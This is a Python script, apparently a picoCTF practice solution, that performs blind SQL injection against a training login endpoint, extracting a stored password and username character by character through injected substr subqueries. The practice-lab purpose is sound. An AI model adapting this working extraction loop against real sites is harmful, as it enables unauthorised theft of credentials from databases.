import requests
from string import printable

# Injection for password
accum = ""

# We start from 1 because substring indexing starts from 1
for i in range(1, 41):
    for letter in printable:
        accum += letter
        
        # We first cast the password field to a binary string before extracting the substring
        # to ensure that the comparison is done byte by byte, which can be important for 
        # case sensitivity and encoding issues
        r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
        + letter +"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")

        if 'NOTHING FOUND...' in r.text:
            accum = accum[:-1]
        else:
            print(f"We found the character: {letter}")

print("password: " + accum)

# Injection for username
accum2 = ""
for i in range(1, 8):
    for letter in printable:
        accum2 += letter
        
        # Same as the injection for password but we replaced the password field 
        # with the username field
        r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
        + letter +"'=( select substr(binary username,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")

        if 'NOTHING FOUND...' in r.text:
            accum2 = accum2[:-1]
        else:
            print(f"We found the character: {letter}")

print("username: " + accum2)
